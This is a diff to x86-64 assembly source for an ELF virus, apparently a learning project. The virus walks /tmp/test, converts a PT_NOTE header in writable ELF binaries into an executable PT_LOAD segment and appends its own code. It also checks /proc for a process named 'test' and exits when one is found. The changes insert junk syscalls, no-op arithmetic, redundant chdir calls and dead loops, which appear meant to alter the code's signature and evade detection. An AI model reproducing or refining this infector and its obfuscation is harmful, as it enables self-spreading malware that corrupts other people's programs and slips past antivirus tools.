@@ -10,6 +10,8 @@
 %define SYS_EXIT		60
 %define SYS_CHDIR		80
 %define SYS_PTRACE		101
+%define SYS_GETUID		107
+%define SYS_GETGID		108
 %define SYS_SYNC		162
 %define SYS_GETDENTS64	217
 %define S_IFDIR 0x4000
@@ -113,11 +115,19 @@ _start:
 ; 	cmp rax, 0
 ; 	jl _end
 
+	mov rax, SYS_GETGID
+	syscall
+
 _evade_specific_process:                                  ; cd to /proc
 	mov qword [r15], '/pro'
 	mov qword [r15 + 4], 'c'
 	lea rdi, [r15]
+	mov rax, SYS_GETUID
+	syscall
 	mov rax, SYS_CHDIR
+	syscall
+
+	mov rax, SYS_GETGID
 	syscall
 
 	cmp rax, 0
@@ -144,6 +154,9 @@ _evade_specific_process:                                  ; cd to /proc
 		cmp rax, 0                                     ; no more files in the directory to read
 		je _close_proc
 
+		mov rax, SYS_GETGID
+		syscall
+
 		xor r14, r14                                   ; i = 0 for the first iteration
 		mov r13, rax                                   ; r13 stores the number of read bytes with getdents
 		_proc_loop:
@@ -152,6 +165,9 @@ _evade_specific_process:                                  ; cd to /proc
 			_check_if_process_is_dir:
 				cmp byte [r15 + 194 + r14], DT_DIR
 				jne _continue_proc_loop
+
+				mov rax, SYS_GETUID
+				syscall
 
 			lea r9, [r15 + 195 + r14]
 			_check_if_process_is_num:
@@ -163,6 +179,9 @@ _evade_specific_process:                                  ; cd to /proc
 				jg _continue_proc_loop
 				inc r9
 				jmp _check_if_process_is_num
+
+			mov rax, SYS_GETGID
+			syscall
 				
 			_pid_folder:
 				lea rdi, [r15 + 195 + r14]
@@ -177,6 +196,8 @@ _evade_specific_process:                                  ; cd to /proc
 	
 				mov r9, rax
 				mov rdi, rax
+				mov rax, SYS_GETUID
+				syscall
 				lea rsi, [r15 + 1532]
 				mov rdx, 16
 				mov rax, SYS_READ
@@ -185,6 +206,9 @@ _evade_specific_process:                                  ; cd to /proc
 				cmp rax, 5
 				jne _close_process_comm
 
+				mov rax, SYS_GETUID
+				syscall
+
 				cmp dword [r15 + 1532], "test"
 				jne _close_process_comm
 				_close_and_quit:
@@ -192,15 +216,24 @@ _evade_specific_process:                                  ; cd to /proc
 					mov rax, SYS_CLOSE
 					syscall
 					jmp _end
+
+					mov rax, SYS_GETGID
+					syscall
 		
 			_close_process_comm:
 				mov rdi, r9
 				mov rax, SYS_CLOSE
 				syscall
 
+				mov rax, SYS_GETGID
+				syscall
+
 			_return_proc:
 				lea rdi, [r15]
 				mov rax, SYS_CHDIR
+				syscall
+
+				mov rax, SYS_GETGID
 				syscall
 
 		_continue_proc_loop:
@@ -215,10 +248,22 @@ _evade_specific_process:                                  ; cd to /proc
 		mov rax, SYS_CLOSE
 		syscall
 
+		mov rax, SYS_GETGID
+		syscall
+
+	_infinite_loop:
+		jmp _folder_to_infect
+		mov rax, SYS_GETGID
+		syscall
+		jmp  _infinite_loop
 _folder_to_infect:	
 	mov qword [r15], '/tmp'
 	mov qword [r15 + 4], '/tes'
 	mov qword [r15 + 8], 't/'                ; assigning /tmp/test to the beginning of the r15 register
+_useless:
+	nop
+	xor rax, rax
+	nop
 
 _folder_stat:
 	mov rdi, r15
@@ -238,6 +283,8 @@ _is_dir:
 	jne _end
 
 _diropen:
+	mov rdi, 0
+	add rdi, rdi
 	mov rdi, r15
 	mov rsi, O_RDONLY
 	mov rax, SYS_OPEN
@@ -249,6 +296,23 @@ _diropen:
 	mov [r15 + 16], rax                            ; saving /tmp/test open fd
 
 _change_to_dir:                                    ; cd to dir
+
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+
 	lea rdi, [r15]
 	mov rax, SYS_CHDIR
 	syscall
@@ -263,23 +327,32 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 	mov rax, SYS_GETDENTS64
 	syscall
 
+	imul rax, rax, 1
 	cmp rax, 0                                     ; no more files in the directory to read
 	je _close_folder
 
 	xor r14, r14                                   ; i = 0 for the first iteration
 	mov r13, rax                                   ; r13 stores the number of read bytes with getdents
+
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
+	syscall
+	imul rax, rax, 1
 	_dirent_loop:
 		movzx r12d, word [r15 + 192 + r14]
-
+		inc r14
 	_stat_file:
+		dec r14
 		lea rdi, [r15 + 195 + r14]                 ; stat over every file
 		lea rsi, [r15 + 32]
 		mov rax, SYS_STAT
 		syscall
+
+		imul rax, rax, 1
 		
 		cmp rax, 0
 		jne _continue_dirent
-
+		add r14, [r15]
 	_check_file_flags:                             ; check if if the program can read and write over the binary
 		lea rax, [r15 + 56]
 		mov rcx, [rax]
@@ -287,24 +360,48 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		test rcx, rcx
 		jz _continue_dirent
 
+		imul rax, rax, 1
+
 		lea rax, [r15 + 56]  
 		mov rcx, [rax]
 		and rcx, S_IWUSR                           ; rcx & S_IWUSR == 1
 		test rcx, rcx
 		jz _continue_dirent
 
+		imul rax, rax, 1
+
+		sub r14, [r15]
 		lea rax, [r15 + 56]
 		mov rcx, [rax]
 		mov rdx, S_IFDIR
 		and rcx, S_IFMT
+		imul rax, rax, 1
 		cmp rdx, rcx
 		je _continue_dirent                        ; checks if its a directory, if so, jump to the next binary of the dirent
 
 		cmp dword [r15 + 80], 64                   ; checks that the file is at least as big as an ELF header
 		jl _continue_dirent
 
+	xor rdi, rdi
+	_important_loop:
+		inc rdi ; +1
+		mov rsi, 0xaf01
+		inc rdi ; +1
+		xor rax, rax
+		imul rax, rax, 1
+		dec rdi ; -1
+		add rdi, 4 ; +4
+		nop
+		cmp rdi, 0x001001
+		jl _important_loop
+
+		imul rax, rax, 1
+
 	_open_bin:
 		lea rdi, [r15 + 195 + r14]
+		mov rsi, 424241
+		nop
+		xor rax, rax
 		mov rsi, 0x0002                            ; O_RDWR 
 		mov rdx, 0644o
 		mov rax, SYS_OPEN                          ; open ( dirent->d_name, O_RDWR )
@@ -312,6 +409,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 		cmp rax, 0
 		jl _continue_dirent
+		imul rax, rax, 1
 
 		mov qword [r15 + 1420], rax                ; save binary fd
 		mov rdi, rax                               ; rax contains fd
@@ -324,6 +422,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 	_is_elf:
 		cmp dword [r15 + 1300], 0x464c457f         ; check if the file starts with 177ELF what indicates it is an ELF binary
 		jne _close_bin
+		imul rax, rax, 1
 
 	_is_infected:
 		cmp dword [r15 + 1308], 0x00000049         ; check if bichooo!! ssuuuuu
@@ -332,6 +431,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 	_save_entry_dpuente:
 		mov r9, [r15 + 1324]
 		mov [r15 + 1508], r9
+		imul rax, rax, 1
 
 		mov qword [r15 + 1484], 0             ; i = 0, iterate over all ELF program headers
 		_read_phdr:
@@ -345,6 +445,8 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			imul r10, r10, PHDR_SIZE
 			add r10, EHDR_SIZE
 
+			imul rax, rax, 1
+
 			mov qword [r15 + 1492], r10           ; saving phdr offset
 
 			mov rax, SYS_PREAD64
@@ -353,27 +455,37 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			cmp word [r15 + 1424], PT_NOTE         ; phdr->type
 			jne _next_phdr                         ; if it is not a PT_NOTE header, continue to check the next one
 
+			imul rax, rax, 1
+
 		_change_ptnote_to_ptload:
 			mov dword [r15 + 1424], PT_LOAD        ; change PT_NOTE header to PT_LOAD
 
 		_change_mem_protections:
 			mov dword [r15 + 1428], PF_R | PF_X    ; disable memory protections
+			imul rax, rax, 1
 
 		_adjust_mem_vaddr:
 		 	mov r9, [r15 + 80]					   ; copy stat.st_size to aux registry
 		 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
 		 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
 
+			imul rax, rax, 1
+
 		_patch_segment_size:                       ; adding the length of the program to the section size as well as to section memory
 			add qword [r15 + 1456], _stop - _start + 5
 			add qword [r15 + 1464], _stop - _start + 5
 			mov qword [r15 + 1472], 0x200000       ; patch phdr.align to 2MB
+
+			imul rax, rax, 1
 
 		_point_offset_to_converted_segment:
 			mov rax, SYS_LSEEK
 			mov rdi, [r15 + 1420]
 			mov rsi, 0
 			mov rdx, SEEK_END
+			syscall
+
+			mov rax, SYS_SYNC
 			syscall
 
 			cmp rax, 0
@@ -385,11 +497,13 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			.delta:
 				pop rbp
 				sub rbp, .delta
+			imul rax, rax, 1
 
 		_append_virus:
 			mov rdi, [r15 + 1420]
 			lea rsi, [rbp + _start]
 			mov rdx, _stop - _start
+			imul rax, rax, 1
 			mov r10, rax                           ; end of target to start appending
 			mov rax, SYS_PWRITE64
 			syscall
@@ -398,6 +512,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1424]
 			mov rdx, PHDR_SIZE
+			imul rax, rax, 1
 			mov qword r10, [r15 + 1492]            ; offset to the phdr
 			mov rax, SYS_PWRITE64
 			syscall
@@ -410,6 +525,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1300]
+			imul rax, rax, 1
 			mov rdx, EHDR_SIZE
 			mov r10, 0
 			mov rax, SYS_PWRITE64
